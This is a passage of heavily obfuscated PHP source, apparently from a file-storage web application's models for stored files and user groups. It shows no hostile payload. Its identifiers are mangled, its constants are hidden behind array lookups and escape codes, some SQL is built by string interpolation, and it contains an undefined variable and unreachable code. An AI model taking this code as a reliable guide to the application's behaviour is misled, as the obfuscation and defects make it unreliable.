$this->addFileCheckExist($›®¿¸®°, $İ›è÷…Ô, $·é¹´À·); if ($ÎÖêÆê‚) { CacheLock::unlock($”Š˜Ø); return $ÎÖêÆê‚; } } $¡øÀªÕÄ = $this->addFileMake($¬èĞ…Ÿù, $·é¹´À·, $›®¿¸®°, $İ›è÷…Ô, $Ç¡öÎ, $ÔÌœø¯¨); $ªÆÍĞ¼½ = $this->addFileData($¡øÀªÕÄ); CacheLock::unlock($”Š˜Ø); if (!$İ›è÷…Ô && $ªÆÍĞ¼½) { $this->fileMd5Check($ªÆÍĞ¼½); } return $ªÆÍĞ¼½; } public function fileMd5Check($¢«…¤­¹) { $›«†´ò =& $_SERVER[Ùæõ‰Ï’]; $Â›šóËê = array($¢«…¤­¹[$›«†´ò[541]], $¢«…¤­¹[$›«†´ò[87]]); $‰ƒÖ¶šÆ = $›«†´ò[2044] . $¢«…¤­¹[$›«†´ò[87]]; $Øœ»ÙÆœ = $›«†´ò[2045] . $¢«…¤­¹[$›«†´ò[541]]; TaskQueue::add($›«†´ò[2046], $Â›šóËê, $‰ƒÖ¶šÆ, $Øœ»ÙÆœ); } public function fileMd5Set($•ä£öï¿, $·‰°Ãı¦) { $½£ÜÂì =& $_SERVER[Ùæõ‰Ï’]; $±ÒË¢Ò¶ = $this->find($•ä£öï¿); if (!$±ÒË¢Ò¶ || $±ÒË¢Ò¶[$½£ÜÂì[547]]) { return; } $¾„‹³ÊŞ = IO::hashMd5($·‰°Ãı¦); if (!$¾„‹³ÊŞ) { return $½£ÜÂì[12]; } $this->where(array($½£ÜÂì[541] => $•ä£öï¿))->save(array($½£ÜÂì[547] => $¾„‹³ÊŞ)); } public function addFileMake($±Ëšà—æ, $Ì‰£Ú°ú, $¢ØŒÁîÖ, $Ó»„İò³, $€·ïüÁ•, $´Çˆî¾ç) { $Ë¥ö„• =& $_SERVER[Ùæõ‰Ï’]; $ÍøçÜ¾ = $this->createFileName($€·ïüÁ•, $¢ØŒÁîÖ, $Ó»„İò³); $ÀÍŠ‰€õ = get_path_father($ÍøçÜ¾); $ƒæ×çÌí = get_path_this($ÍøçÜ¾); if ($´Çˆî¾ç) { $÷¾öôâ = IO::move($±Ëšà—æ, $ÀÍŠ‰€õ, !1, $ƒæ×çÌí); } else { $÷¾öôâ = IO::copy($±Ëšà—æ, $ÀÍŠ‰€õ, !1, $ƒæ×çÌí); } if (!$÷¾öôâ) { return !1; } $Í£²Ùª = KodIO::defaultDriver(); $øàîÂó = array($Ë¥ö„•[617] => $Ì‰£Ú°ú, $Ë¥ö„•[2040] => 1, $Ë¥ö„•[494] => $€·ïüÁ•, $Ë¥ö„•[891] => $Í£²Ùª[$Ë¥ö„•[475]], $Ë¥ö„•[495] => $ÍøçÜ¾, $Ë¥ö„•[2041] => $¢ØŒÁîÖ, $Ë¥ö„•[2042] => $Ó»„İò³); return $øàîÂó; } public function addFileCheckExist($ŸÌñÉ¡æ, $“Ğ‹ãëÓ, $¨ùüøÏˆ) { $×Úã¤¬ó =& $_SERVER[Ùæõ‰Ï’]; $„úÜÔÁë = $this->findByHash($ŸÌñÉ¡æ, $“Ğ‹ãëÓ); if (!$„úÜÔÁë) { return !1; } $“´À½•Ú = array($×Úã¤¬ó[2040] => intval($„úÜÔÁë[$×Úã¤¬ó[2047]]) + 1, $×Úã¤¬ó[617] => $¨ùüøÏˆ); $this->where(array($×Úã¤¬ó[542] => $„úÜÔÁë[$×Úã¤¬ó[541]]))->save($“´À½•Ú); return $„úÜÔÁë; } public function remove($ÀŒ„Çàé) { $this->linkCountChange($ÀŒ„Çàé, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÇŒ†„ë¡) { $this->linkCountChange($ÇŒ†„ë¡, !0); } public function linkCountChange($¨²ª±¬Å, $½„˜Ë½ƒ) { $­¡»È°Æ =& $_SERVER[Ùæõ‰Ï’]; if (!$¨²ª±¬Å) { return; } if (!is_array($¨²ª±¬Å)) { $¨²ª±¬Å = array($¨²ª±¬Å); } $î»—Şô® = array(); foreach ($¨²ª±¬Å as $ö¿´Ã¤ğ) { $¶ı ¹ÓÅ = $ö¿´Ã¤ğ . $­¡»È°Æ[12]; if (!$î»—Şô®[$¶ı ¹ÓÅ]) { $î»—Şô®[$¶ı ¹ÓÅ] = 0; } $î»—Şô®[$¶ı ¹ÓÅ]++; } $šæËçÁ = array(); foreach ($î»—Şô® as $ö¿´Ã¤ğ => $Îæ€àÂĞ) { $¶ı ¹ÓÅ = $Îæ€àÂĞ . $­¡»È°Æ[12]; if (!$šæËçÁ[$¶ı ¹ÓÅ]) { $šæËçÁ[$¶ı ¹ÓÅ] = array(); } $šæËçÁ[$¶ı ¹ÓÅ][] = $ö¿´Ã¤ğ; } foreach ($šæËçÁ as $Îæ€àÂĞ => $İ¸—æ÷Ğ) { if (!$İ¸—æ÷Ğ) { continue; } $Îæ€àÂĞ = $½„˜Ë½ƒ ? $Îæ€àÂĞ : -intval($Îæ€àÂĞ); $ÓÔˆ²‰– = array($­¡»È°Æ[541] => array($­¡»È°Æ[7], $İ¸—æ÷Ğ)); if ($Îæ€àÂĞ < 0) { $ÓÔˆ²‰–[$­¡»È°Æ[2047]] = array($­¡»È°Æ[1106], abs($Îæ€àÂĞ)); } $this->where($ÓÔˆ²‰–)->setAdd($­¡»È°Æ[2047], $Îæ€àÂĞ); } } public function findByHash($ºâˆæñÕ, $ø•ÎÚÈ³ = false) { $ÌÑÂ»Ù =& $_SERVER[Ùæõ‰Ï’]; if (!$ºâˆæñÕ && !$ø•ÎÚÈ³) { return !1; } $“É¾±²¼ = array($ÌÑÂ»Ù[2041] => $ºâˆæñÕ); if ($ø•ÎÚÈ³) { $“É¾±²¼ = array($ÌÑÂ»Ù[2042] => $ø•ÎÚÈ³); } return $this->order($ÌÑÂ»Ù[2048])->where($“É¾±²¼)->find(); } public function clearEmpty($îä§…Õº = 0) { $ãôôáÌ‡ =& $_SERVER[Ùæõ‰Ï’]; $Õí‹µí = time() - 3600 * 24 * $îä§…Õº; $Á†Š«Ü = $ãôôáÌ‡[2049] . $Õí‹µí; $ÁÀãšÜ‡ = $this->where($Á†Š«Ü)->select(); if (!$ÁÀãšÜ‡) { return; } $ô¯ğ«š = new Task($ãôôáÌ‡[2050], $ãôôáÌ‡[12], count($ÁÀãšÜ‡)); foreach ($ÁÀãšÜ‡ as $³†ˆÜÉõ) { $ô¯ğ«š->update(1); $this->resetFile($³†ˆÜÉõ); } $ô¯ğ«š->end(); } public function resetFile($ÌİÀŞËì) { $×ÊÏË =& $_SERVER[Ùæõ‰Ï’]; $¨½½ƒ­ = array($×ÊÏË[542] => $ÌİÀŞËì[$×ÊÏË[541]]); $£½ççêŠ = Model($×ÊÏË[1430])->where($¨½½ƒ­)->count(); $åÅÖÊà = Model($×ÊÏË[2051])->where($¨½½ƒ­)->count(); $Ïø©™€‹ = intval($£½ççêŠ) + intval($åÅÖÊà); if ($Ïø©™€‹ == 0) { IO::remove($ÌİÀŞËì[$×ÊÏË[87]]); Model($×ÊÏË[2052])->delete($ÌİÀŞËì[$×ÊÏË[541]]); $this->where($¨½½ƒ­)->delete(); $this->metaSet($ÌİÀŞËì[$×ÊÏË[541]], null, null); write_log(ACTION . $×ÊÏË[2053] . KodUser::id() . $×ÊÏË[2054] . $ÌİÀŞËì[$×ÊÏË[541]] . $×ÊÏË[2055] . $ÌİÀŞËì[$×ÊÏË[79]] . $×ÊÏË[201] . $ÌİÀŞËì[$×ÊÏË[87]], $×ÊÏË[2056]); return; } if ($ÌİÀŞËì[$×ÊÏË[2047]] != $Ïø©™€‹) { $this->where($¨½½ƒ­)->save(array($×ÊÏË[2040] => $Ïø©™€‹)); } } public function storageInfo($¾ï©â­î = false) { $Çíƒä×œ =& $_SERVER[Ùæõ‰Ï’]; $µùŠã° = $this->count() + 0.0; $ç–ÁÑõ¸ = 0; $òğùÔ = 1; $şß“Éæ = 0; $—‰Ò“øš = 5000; for ($â¸ÃŒŸ = 0; $â¸ÃŒŸ < $µùŠã°; $â¸ÃŒŸ = $â¸ÃŒŸ + $—‰Ò“øš) { $‚º¹ùõ– = $this->limit($â¸ÃŒŸ, $â¸ÃŒŸ + $—‰Ò“øš)->select(); foreach ($‚º¹ùõ– as $‘ø£ºË) { $òğùÔ += $‘ø£ºË[$Çíƒä×œ[79]] * $‘ø£ºË[$Çíƒä×œ[2047]]; $ç–ÁÑõ¸ += $‘ø£ºË[$Çíƒä×œ[79]] * ($‘ø£ºË[$Çíƒä×œ[2047]] - 1); $şß“Éæ += $‘ø£ºË[$Çíƒä×œ[2047]]; } } $áµæİ• = array($Çíƒä×œ[2057] => $òğùÔ, $Çíƒä×œ[2058] => $ç–ÁÑõ¸, $Çíƒä×œ[2059] => $ç–ÁÑõ¸ / $òğùÔ, $Çíƒä×œ[83] => $µùŠã°, $Çíƒä×œ[2060] => $şß“Éæ); return $áµæİ•; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\x6d\x65" => "\x67\x72\157\165\160\137\x6d\145\x74\x61", "\155\x65\x74\x61\x46\151\145\x6c\x64" => "\x67\x72\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($ïï§¹´‡) { $ÀÛÀÀÉ =& $_SERVER[Ùæõ‰Ï’]; return array($ÀÛÀÀÉ[2061] => array($ïï§¹´‡[0], $ÀÛÀÀÉ[2062]), $ÀÛÀÀÉ[2063] => array($ïï§¹´‡[0], $ÀÛÀÀÉ[2064])); } protected function getInfo($ÎéÇªÏö, $Ü‰ŞÃÀü = false) { $’ÑêÏÈ® = $this->getInfoSimple($ÎéÇªÏö); if (!$’ÑêÏÈ®) { return !1; } if ($Ü‰ŞÃÀü) { return $this->_listDataApplyItem($’ÑêÏÈ®); } return $this->cacheFunctionGet($_SERVER[Ùæõ‰Ï’][2065], $ÎéÇªÏö); } protected function getInfoSimple($Úè‘˜‚®, $‘™Â‹Á = false) { $§èçü‘ä =& $_SERVER[Ùæõ‰Ï’]; if ($‘™Â‹Á) { $««Óæ¬– = array($§èçü‘ä[1979] => intval($Úè‘˜‚®)); $Ñ”ß…™ = $this->where($««Óæ¬–)->find(); return is_array($Ñ”ß…™) ? $Ñ”ß…™ : array(); } return $this->cacheFunctionGet($§èçü‘ä[2066], $Úè‘˜‚®); } protected function groupAdd($¥Öë¯±Ä) { $øÄØ¡š =& $_SERVER[Ùæõ‰Ï’]; if (!$¥Öë¯±Ä[$øÄØ¡š[192]] && isset($¥Öë¯±Ä[$øÄØ¡š[1979]]) && $¥Öë¯±Ä[$øÄØ¡š[1979]] == 1) { if ($ĞæÄ‹ç = $this->getInfoSimple($¥Öë¯±Ä[$øÄØ¡š[1979]], !0)) { return $¥Öë¯±Ä[$øÄØ¡š[1979]]; } } else { $ĞæÄ‹ç = $this->getInfoSimple($¥Öë¯±Ä[$øÄØ¡š[192]]); if (!$ĞæÄ‹ç) { return !1; } } $¯ôÔİ‘Å = $øÄØ¡š[594]; if ($ĞæÄ‹ç[$øÄØ¡š[584]]) { $¯ôÔİ‘Å = $ĞæÄ‹ç[$øÄØ¡š[584]] . $ĞæÄ‹ç[$øÄØ¡š[1979]] . $øÄØ¡š[50]; } $“·ñ›ó· = array($øÄØ¡š[494] => $this->groupNameAuto($¥Öë¯±Ä[$øÄØ¡š[192]], $¥Öë¯±Ä[$øÄØ¡š[32]]), $øÄØ¡š[477] => $¥Öë¯±Ä[$øÄØ¡š[192]], $øÄØ¡š[652] => $¯ôÔİ‘Å, $øÄØ¡š[2067] => $¥Öë¯±Ä[$øÄØ¡š[1966]], $øÄØ¡š[2068] => 0, $øÄØ¡š[1983] => 0); if (isset($¥Öë¯±Ä[$øÄØ¡š[2003]])) { $“·ñ›ó·[$øÄØ¡š[2003]] = $¥Öë¯±Ä[$øÄØ¡š[2003]]; } else { $ ¼ö·¥§ = $this->max($øÄØ¡š[2003]); if (!$ ¼ö·¥§) { $ ¼ö·¥§ = 0; } $“·ñ›ó·[$øÄØ¡š[2003]] = $ ¼ö·¥§ + 1; } if (!empty($¥Öë¯±Ä[$øÄØ¡š[1979]])) { $“·ñ›ó·[$øÄØ¡š[1979]] = $¥Öë¯±Ä[$øÄØ¡š[1979]]; } $ªÅ×©Ç = $this->add($“·ñ›ó·); $this->setNamePinyin($ªÅ×©Ç, $“·ñ›ó·[$øÄØ¡š[32]]); if (isset($¥Öë¯±Ä[$øÄØ¡š[2069]])) { $this->metaSet($ªÅ×©Ç, array($øÄØ¡š[2069] => $¥Öë¯±Ä[$øÄØ¡š[2069]], $øÄØ¡š[2070] => $¥Öë¯±Ä[$øÄØ¡š[2070]])); unset($¥Öë¯±Ä[$øÄØ¡š[2069]]); unset($¥Öë¯±Ä[$øÄØ¡š[2070]]); } Model($øÄØ¡š[1430])->groupRootAdd($ªÅ×©Ç); $this->_clearCache($¥Öë¯±Ä[$øÄØ¡š[192]]); return $ªÅ×©Ç; } protected function groupEdit($¢Ş‘™–Ò, $ş²÷ÔàÜ) { $Å‡‘à„Ñ =& $_SERVER[Ùæõ‰Ï’]; $…Ì»–£¶ = $this->getInfoSimple($¢Ş‘™–Ò); if (!$…Ì»–£¶) { return !1; } if (!empty($ş²÷ÔàÜ[$Å‡‘à„Ñ[192]])) { $…¥¡³‰À = $this->getInfoSimple($ş²÷ÔàÜ[$Å‡‘à„Ñ[192]]); if (!$…¥¡³‰À) { return !1; } if ($…Ì»–£¶[$Å‡‘à„Ñ[1979]] == $…¥¡³‰À[$Å‡‘à„Ñ[1979]]) { return !1; } if ($ş²÷ÔàÜ[$Å‡‘à„Ñ[192]] != $…Ì»–£¶[$Å‡‘à„Ñ[192]]) { if ($…¥¡³‰À[$Å‡‘à„Ñ[584]] !== $…Ì»–£¶[$Å‡‘à„Ñ[584]] && strpos($…¥¡³‰À[$Å‡‘à„Ñ[584]], $…Ì»–£¶[$Å‡‘à„Ñ[584]] . $…Ì»–£¶[$Å‡‘à„Ñ[1979]] . $Å‡‘à„Ñ[50]) === 0) { return !1; } $ş²÷ÔàÜ[$Å‡‘à„Ñ[652]] = $…¥¡³‰À[$Å‡‘à„Ñ[584]] . $ş²÷ÔàÜ[$Å‡‘à„Ñ[192]] . $Å‡‘à„Ñ[50]; $this->_changeChildLevel($…Ì»–£¶, $…¥¡³‰À); $this->_clearCache($…¥¡³‰À[$Å‡‘à„Ñ[1979]]); $this->_clearCache($…Ì»–£¶[$Å‡‘à„Ñ[192]]); } } if (isset($ş²÷ÔàÜ[$Å‡‘à„Ñ[32]])) { $this->setNamePinyin($¢Ş‘™–Ò, $ş²÷ÔàÜ[$Å‡‘à„Ñ[32]]); } if (isset($ş²÷ÔàÜ[$Å‡‘à„Ñ[2069]])) { $this->metaSet($¢Ş‘™–Ò, array($Å‡‘à„Ñ[2069] => $ş²÷ÔàÜ[$Å‡‘à„Ñ[2069]], $Å‡‘à„Ñ[2070] => $ş²÷ÔàÜ[$Å‡‘à„Ñ[2070]])); unset($ş²÷ÔàÜ[$Å‡‘à„Ñ[2069]]); unset($ş²÷ÔàÜ[$Å‡‘à„Ñ[2070]]); } $this->_clearChildrenCache($…Ì»–£¶); return $this->where(array($Å‡‘à„Ñ[2071] => $¢Ş‘™–Ò))->save($ş²÷ÔàÜ); } private function _clearChildrenCache($’å†ê÷À) { $æØ®Ì¤º =& $_SERVER[Ùæõ‰Ï’]; $Ùò³û¼ = array($æØ®Ì¤º[652] => array($æØ®Ì¤º[612], $’å†ê÷À[$æØ®Ì¤º[584]] . $’å†ê÷À[$æØ®Ì¤º[1979]] . $æØ®Ì¤º[613])); $²ğÚî€• = $this->field($æØ®Ì¤º[1979])->where($Ùò³û¼)->select(); foreach ($²ğÚî€• as $Ä’–Ãßû) { $this->_clearCache($Ä’–Ãßû[$æØ®Ì¤º[1979]]); } } private function _clearCache($ÏÙÛïê†) { $¸ç»©Â =& $_SERVER[Ùæõ‰Ï’]; $this->cacheFunctionClear($¸ç»©Â[2065], $ÏÙÛïê†); $this->cacheFunctionClear($¸ç»©Â[2066], $ÏÙÛïê†); } private function _changeChildLevel($šª»¥¡Ë, $¤©Ğêß–, $¶‚ş¨øÎ = false) { $›¥ã¶¢ =& $_SERVER[Ùæõ‰Ï’]; $Œ™ØÏË¸ = $šª»¥¡Ë[$›¥ã¶¢[584]] . $šª»¥¡Ë[$›¥ã¶¢[1979]] . $›¥ã¶¢[50]; $‰øœø¼ = $¤©Ğêß–[$›¥ã¶¢[584]] . $¤©Ğêß–[$›¥ã¶¢[1979]] . $›¥ã¶¢[50] . $šª»¥¡Ë[$›¥ã¶¢[1979]] . $›¥ã¶¢[50]; if ($¶‚ş¨øÎ) { $‰øœø¼ = $¤©Ğêß–[$›¥ã¶¢[584]] . $¤©Ğêß–[$›¥ã¶¢[1979]] . $›¥ã¶¢[50]; } $óÊÜ‹‹à = array($›¥ã¶¢[652] => array($›¥ã¶¢[612], $šª»¥¡Ë[$›¥ã¶¢[584]] . $šª»¥¡Ë[$›¥ã¶¢[1979]] . $›¥ã¶¢[613])); $²£ÈÈŞ• = array($›¥ã¶¢[652] => array($›¥ã¶¢[661], "\x72\x65\x70\154\x61\x63\145\x28\x70\141\162\x65\156\164\x4c\145\x76\x65\x6c\x2c\47{$Œ™ØÏË¸}\x27\54\47{$‰øœø¼}\47\x29")); $this->_clearChildrenCache($šª»¥¡Ë); $this->where($óÊÜ‹‹à)->data($²£ÈÈŞ•)->save(); } public function setNamePinyin($³õ¼éøÛ, $ĞÁ£‡´í = false) { $–¡òŸı¥ =& $_SERVER[Ùæõ‰Ï’]; if (!$ĞÁ£‡´í) { $ —ÈË‚ = $this->getInfoSimple($³õ¼éøÛ); $ĞÁ£‡´í = $ —ÈË‚[$–¡òŸı¥[32]]; } if (!Input::check($ĞÁ£‡´í, $–¡òŸı¥[655])) { $this->metaSet($³õ¼éøÛ, $–¡òŸı¥[538], null); $this->metaSet($³õ¼éøÛ, $–¡òŸı¥[537], null); return; } $ôèúÏà² = array($–¡òŸı¥[538] => str_replace($–¡òŸı¥[53], $–¡òŸı¥[12], Pinyin::get($ĞÁ£‡´í)), $–¡òŸı¥[537] => Pinyin::get($ĞÁ£‡´í, $–¡òŸı¥[656])); $this->metaSet($³õ¼éøÛ, $ôèúÏà²); } protected function groupStatus($ÁÅ‘åû¤, $²‚µñ§«) { $’‰™Ÿœ† =& $_SERVER[Ùæõ‰Ï’]; $Ó¨¸¢…‘ = $this->getInfoSimple($ÁÅ‘åû¤); if (!$Ó¨¸¢…‘) { return !1; } $this->_clearCache($ÁÅ‘åû¤); return $this->metaSet($ÁÅ‘åû¤, $’‰™Ÿœ†[833], $²‚µñ§«); if ($²‚µñ§« == $’‰™Ÿœ†[91]) { $Šø‰é…† = $this->parentLevelArray($Ó¨¸¢…‘[$’‰™Ÿœ†[584]]); } else { } $Šø‰é…†[] = $Ó¨¸¢…‘[$’‰™Ÿœ†[1979]]; $™³‚ = array(); foreach ($Šø‰é…† as $ÁÅ‘åû¤) { $™³‚[] = array($’‰™Ÿœ†[1979] => $ÁÅ‘åû¤, $’‰™Ÿœ†[97] => $’‰™Ÿœ†[833], $’‰™Ÿœ†[450] => $²‚µñ§«); $this->_clearCache($ÁÅ‘åû¤); } return Model($’‰™Ÿœ†[2072])->addAll($™³‚, array(), !0); } protected function groupRemove($÷Âˆƒû‡, $ÆşÎ½¡¸ = false) { $íœèÆ™› =& $_SERVER[Ùæõ‰Ï’]; $§¼£¨Í = array($íœèÆ™›[1979] => $÷Âˆƒû‡); $¼šÙÚÛ = $this->where($§¼£¨Í)->find(); if (!$¼šÙÚÛ || $¼šÙÚÛ[$íœèÆ™›[192]] == 0) { return !1; } if (!$ÆşÎ½¡¸) { $ÄùÂô’ä = $this->getInfoSimple($¼šÙÚÛ[$íœèÆ™›[192]]); $this->_changeChildLevel($¼šÙÚÛ, $ÄùÂô’ä, !0); $this->where(array($íœèÆ™›[192] => $÷Âˆƒû‡))->save(array($íœèÆ™›[192] => $¼šÙÚÛ[$íœèÆ™›[192]])); $this->_clearCache($ÄùÂô’ä[$íœèÆ™›[1979]]); } Model($íœèÆ™›[2072])->where($§¼£¨Í)->delete(); Model($íœèÆ™›[2073])->where($§¼£¨Í)->delete(); Model($íœèÆ™›[907])->groupRootRemove($÷Âˆƒû‡); $this->_clearCache($¼šÙÚÛ[$íœèÆ™›[192]]); return $this->where($§¼£¨Í)->delete(); } protected function groupSort($»¦‡¢À) { $ØğÏê»æ =& $_SERVER[Ùæõ‰Ï’]; $Ì¬È Ü÷ = array(); foreach ($»¦‡¢À as $€®÷£× => $À¸‡ŞË) { $Ì¬È Ü÷[] = array($ØğÏê»æ[1979], $À¸‡ŞË, $ØğÏê»æ[2003], $€®÷£× + 1); } $this->saveAll($Ì¬È Ü÷); } public function listData() { $†ë¢ï¥æ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($†ë¢ï¥æ[$_SERVER[Ùæõ‰Ï’][445]]); return $†ë¢ï¥æ; } private function _makeOrder($ïäòÄÅÜ = '') { $£ôÒ›ß =& $_SERVER[Ùæõ‰Ï’]; $Ê–ÓÕ = array($£ôÒ›ß[1979], $£ôÒ›ß[32], $£ôÒ›ß[1968], $£ôÒ›ß[231]); $æÃÇıß = array($£ôÒ›ß[523] => $£ôÒ›ß[524], $£ôÒ›ß[525] => $£ôÒ›ß[526]); $®Ëç˜€Ã = Input::get($£ôÒ›ß[530], $£ôÒ›ß[7], $£ôÒ›ß[1983], $Ê–ÓÕ); $Ú¸Á‹«İ = Input::get($£ôÒ›ß[531], $£ôÒ›ß[7], $£ôÒ›ß[2074], array($£ôÒ›ß[2074], $£ôÒ›ß[525])); $Ú¸Á‹«İ = $æÃÇıß[$Ú¸Á‹«İ]; $ïäòÄÅÜ = $ïäòÄÅÜ . "{$®Ëç˜€Ã}\40{$Ú¸Á‹«İ}\x2c\40\147\162\157\165\160\111\104\x20\141\x73\143"; return $this->order($ïäòÄÅÜ); } public function listChild($¾õØâé) { $Üİ¢á±Ë =& $_SERVER[Ùæõ‰Ï’]; $¹‡ÏéàÓ = $this->where(array($Üİ¢á±Ë[192] => $¾õØâé))->_makeOrder()->selectPage(200); $this->_listDataApply($¹‡ÏéàÓ[$Üİ¢á±Ë[445]]); return $¹‡ÏéàÓ; } public function listChildIds($­“Üêæ«) { $ü½å¾Òª =& $_SERVER[Ùæõ‰Ï’]; if (is_string($ê”÷À±ı)) { $­“Üêæ« = explode($ü½å¾Òª[50], $­“Üêæ«); } $ùÓùŠŞ€ = $this->where(array($ü½å¾Òª[1979] => array($ü½å¾Òª[7], $­“Üêæ«)))->field($ü½å¾Òª[2075])->select(); if (!$ùÓùŠŞ€) { return !1; } $Ë™¢Ğğå = array(); foreach ($ùÓùŠŞ€ as $·àü³ÑÂ) { $Ë™¢Ğğå[] = "\163\145\154\x65\143\x74\x20\147\162\157\x75\160\111\104\x20\146\x72\x6f\x6d\40\140\x67\x72\x6f\165\x70\x60\40\x77\x68\x65\x72\x65\40\160\x61\162\145\156\164\x4c\x65\166\x65\154\x20\x6c\151\153\145\40\x27{$·àü³ÑÂ[$ü½å¾Òª[584]]}{$·àü³ÑÂ[$ü½å¾Òª[1979]]}\x2c\x25\47"; } $Ë™¢Ğğå = implode($ü½å¾Òª[2076], $Ë™¢Ğğå); $ùÓùŠŞ€ = $this->query($Ë™¢Ğğå); if (!$ùÓùŠŞ€) { return array(); } $­“Üêæ« = array_to_keyvalue($ùÓùŠŞ€, $ü½å¾Òª[12], $ü½å¾Òª[1979]); return array_unique($­“Üêæ«); } public function listByID($´ûæ€ñ°) { $¶Âáó×ı =& $_SERVER[Ùæõ‰Ï’]; if (!$´ûæ€ñ°) { return array(); } $¥Š¯£áô = array($¶Âáó×ı[1979] => array($¶Âáó×ı[7], $´ûæ€ñ°)); $®…É™ë¿ = $this->where($¥Š¯£áô)->select(); $®…É™ë¿ = array_sort_keep($®…É™ë¿, $¶Âáó×ı[1979], $´ûæ€ñ°); $this->_listDataApply($®…É™ë¿); return $®…É™ë¿; } public function listSearch($û¨ÍÄÏÕ) { $îÅş¾“” =& $_SERVER[Ùæõ‰Ï’]; $º˜Š†¡¤ = trim($û¨ÍÄÏÕ[$îÅş¾“”[2077]]); $›ôÎ¨ß = explode($îÅş¾“”[53], $º˜Š†¡¤); if (!$º˜Š†¡¤ || count($›ôÎ¨ß) == 1) { return $this->listSearchNow($û¨ÍÄÏÕ); } $Æú÷ ªš = array($îÅş¾“”[445] => array()); foreach ($›ôÎ¨ß as $¯àºÏŠ±) { if (!trim($¯àºÏŠ±)) { continue; } $û¨ÍÄÏÕ[$îÅş¾“”[2077]] = $¯àºÏŠ±; $»§†Ô¢’ = $this->listSearchNow($û¨ÍÄÏÕ); $Æú÷ ªš[$îÅş¾“”[445]] = array_merge($Æú÷ ªš[$îÅş¾“”[445]], $»§†Ô¢’[$îÅş¾“”[445]]); } $Æú÷ ªš[$îÅş¾“”[445]] = array_unique_by_key($Æú÷ ªš[$îÅş¾“”[445]], $îÅş¾“”[1979]); $Æú÷ ªš[$îÅş¾“”[442]] = array($îÅş¾“”[443] => count($Æú÷ ªš[$îÅş¾“”[445]]), $îÅş¾“”[439] => 20, $îÅş¾“”[429] => 1, $îÅş¾“”[444] => 1); return $Æú÷ ªš; } public function listSearchNow($öŠ®ÍÜ) { $²í•ÛõÂ =& $_SERVER[Ùæõ‰Ï’]; $ŠÊ¶ÓÔµ = trim($öŠ®ÍÜ[$²í•ÛõÂ[2077]]); $˜ÆÏ¢÷ = isset($öŠ®ÍÜ[$²í•ÛõÂ[2078]]) ? $öŠ®ÍÜ[$²í•ÛõÂ[2078]] : !1; if (!trim($ŠÊ¶ÓÔµ)) { return !1; } $ŠÊ¶ÓÔµ = str_replace($²í•ÛõÂ[2079], $²í•ÛõÂ[2080], $ŠÊ¶ÓÔµ); $š¦”Ø‘” = array($²í•ÛõÂ[1979] => array($²í•ÛõÂ[459], "{$ŠÊ¶ÓÔµ}\x25"), $²í•ÛõÂ[32] => array($²í•ÛõÂ[459], "\x25{$ŠÊ¶ÓÔµ}\x25"), $²í•ÛõÂ[1091] => $²í•ÛõÂ[2081]); if ($˜ÆÏ¢÷) { $±…ÒŒí­ = $this->getInfoSimple($˜ÆÏ¢÷); $†·ßŸà• = $±…ÒŒí­[$²í•ÛõÂ[584]] . $˜ÆÏ¢÷ . $²í•ÛõÂ[613]; $š¦”Ø‘” = array($š¦”Ø‘”, array($²í•ÛõÂ[584] => array($²í•ÛõÂ[459], $†·ßŸà•))); } $š¦”Ø‘” = $this->parseWhereLike($š¦”Ø‘”); $‰‘˜®˜„ = $this->_makeOrder()->where($š¦”Ø‘”)->selectPage(20); $‰‘˜®˜„ = $‰‘˜®˜„ ? $‰‘˜®˜„ : array($²í•ÛõÂ[445] => array(), $²í•ÛõÂ[442] => array()); if (!$‰‘˜®˜„ || count($‰‘˜®˜„[$²í•ÛõÂ[445]]) < 5 && Input::check($ŠÊ¶ÓÔµ, $²í•ÛõÂ[394])) { $‘­¡”Úé = $this->groupChildrenAll($˜ÆÏ¢÷); $×ÈŞşËì = $this->_searchFromMeta($²í•ÛõÂ[537], $ŠÊ¶ÓÔµ, 10, $‘­¡”Úé); $õ¹†âƒğ = $this->_searchFromMeta($²í•ÛõÂ[538], $ŠÊ¶ÓÔµ, 10, $‘­¡”Úé); $ëğ­€‹Ñ = array_merge($×ÈŞşËì, $õ¹†âƒğ, $‰‘˜®˜„[$²í•ÛõÂ[445]]); $‰‘˜®˜„[$²í•ÛõÂ[445]] = array_unique_by_key($ëğ­€‹Ñ, $²í•ÛõÂ[1979]); $‰‘˜®˜„[$²í•ÛõÂ[442]][$²í•ÛõÂ[443]] = count($‰‘˜®˜„[$²í•ÛõÂ[445]]); $‰‘˜®˜„[$²í•ÛõÂ[442]][$²í•ÛõÂ[444]] = ceil($‰‘˜®˜„[$²í•ÛõÂ[442]][$²í•ÛõÂ[443]] / $‰‘˜®˜„[$²í•ÛõÂ[442]][$²í•ÛõÂ[439]]); } $this->_listDataApply($‰‘˜®˜„[$²í•ÛõÂ[445]]); return $‰‘˜®˜„; } protected function groupChildrenAll($Åà•ğ·) { $“´‡ã½ =& $_SERVER[Ùæõ‰Ï’]; if (!$Åà•ğ·) { return !1; } if (!is_array($Åà•ğ·)) { $Åà•ğ· = array($Åà•ğ·); } $¯©œ¢ = $Åà•ğ·; foreach ($Åà•ğ· as $¯Ÿâ°½) { $Áæï¨ = $this->getInfoSimple($¯Ÿâ°½); $Õ—¢¬ÔÔ = array($“´‡ã½[584] => array($“´‡ã½[459], $Áæï¨[$“´‡ã½[584]] . $¯Ÿâ°½ . $“´‡ã½[613])); $«ÓÆ‚ä = $this->field($“´‡ã½[1979])->where($Õ—¢¬ÔÔ)->select(); $¯©œ¢ = array_merge($¯©œ¢, array_to_keyvalue($«ÓÆ‚ä, $“´‡ã½[12], $“´‡ã½[1979])); } return array_unique($¯©œ¢); } private function _searchFromMeta($­‡‘ÕƒÍ, $Ÿ–Ö§ÇÛ, $¾ªç«„‘, $š¥ºãÙ) { $Ã‰ßê‹ =& $_SERVER[Ùæõ‰Ï’]; $Ÿ–Ö§ÇÛ = strtolower($Ÿ–Ö§ÇÛ); $˜æÚ•Õ = array($Ã‰ßê‹[97] => $­‡‘ÕƒÍ, $Ã‰ßê‹[450] => array($Ã‰ßê‹[459], "\45{$Ÿ–Ö§ÇÛ}\x25")); $˜æÚ•Õ = $this->parseWhereLike($˜æÚ•Õ); if ($š¥ºãÙ) { $˜æÚ•Õ[$Ã‰ßê‹[1979]] = array($Ã‰ßê‹[7], $š¥ºãÙ); } $˜ä¦¢²î = 